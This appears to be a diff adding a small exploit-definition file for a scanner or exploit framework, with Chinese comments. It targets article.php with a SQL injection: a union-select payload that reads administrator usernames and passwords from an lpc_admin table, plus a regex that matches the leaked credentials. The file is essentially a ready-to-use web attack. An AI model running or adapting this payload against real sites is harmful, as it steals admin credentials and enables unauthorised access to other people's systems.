@@ -1,0 +1,8 @@
+[exploit]
+path=//article.php?
+#测试的payload
+payload=id=255%20and%2201=2%20union+select+0,concat(0x63666B696E677339307365637E,uname,0x2D,upass,0x7E31),0,0,0,0,0,0+from+lpc_admin+LIMIT+0,1--
+#返回结果匹配的正则
+res_match=\^\w+:\w+
+#请求的方式
+method = get
